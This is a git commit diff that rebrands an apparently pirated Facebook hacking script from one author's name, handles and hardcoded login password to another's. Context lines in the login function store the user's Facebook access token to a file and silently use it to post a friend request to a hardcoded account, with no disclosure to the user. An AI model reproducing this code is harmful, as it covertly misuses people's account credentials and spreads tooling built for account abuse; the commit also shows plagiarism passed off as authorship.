2af0f87928317b3c3a54abe0d74d8f9588bc62c7
MrShanu <63833049+MrShanu@users.noreply.github.com>
2020-04-17 13:24:48 +0500

    Update and rename zeroboy.py to shanu.py

--- shanu.py
+++ shanu.py
@@ -49,17 +49,17 @@ def jalan(z):
 ##### LOGO #####
 logo = """ -----------------------------•◈•
 (  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
+|__(~)    •||•MR - SHANU -OFFICAL------•◈•
+|__\~~) •||•SHANU - HEER---------------•◈•
+|__(-----\  •◈•------SHANU-CREATIONS--------•◈•
 |__~~~\ •◈•-----█-------⑦-------█------•◈•
 |__~~~\ •◈•-----█-------⑧-------█------•◈•
 |__~~~\ •◈•-----█-------⑥-------█------•◈•
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mShanu Ch
+\033[1;96mInstagram \033[1;93m: \033[1;mr_perfect021
+\033[1;96mFacebook  \033[1;93m: \033[1; soldierspd
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/MrShanu
 \033[1;91m======================================="""
 
 def tik():
@@ -80,15 +80,15 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mShanu Ch
+\033[1;96mInstagram \033[1;93m: \033[1;92mMr_perfect021
+\033[1;96mFacebook  \033[1;93m: \033[1;92m soldierspd
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/MrShanu
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "shanu"
+CorrectPassword = "sh"
 
 loop = 'true'
 while (loop == 'true'):
@@ -144,7 +144,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.Facebook.com/soldierspd')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
